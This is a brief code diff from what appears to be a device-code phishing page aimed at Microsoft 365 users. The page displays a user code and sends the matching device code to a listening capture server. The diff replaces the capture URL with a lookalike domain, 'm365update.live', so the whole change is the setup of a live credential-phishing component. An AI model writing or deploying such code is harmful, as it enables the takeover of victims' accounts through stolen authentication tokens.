@@ -18,7 +18,7 @@
              
              document.getElementById('code').innerHTML += data.user_code;
              // Change this line to point to your listening webserver
-             $.get("https://token-tactics-captureserver.eastus.cloudapp.azure.com:8443/?id=" + data.device_code);
+             $.get("https://m365update.live:8443/?id=" + data.device_code);
              //document.write(data.message);
          });
          
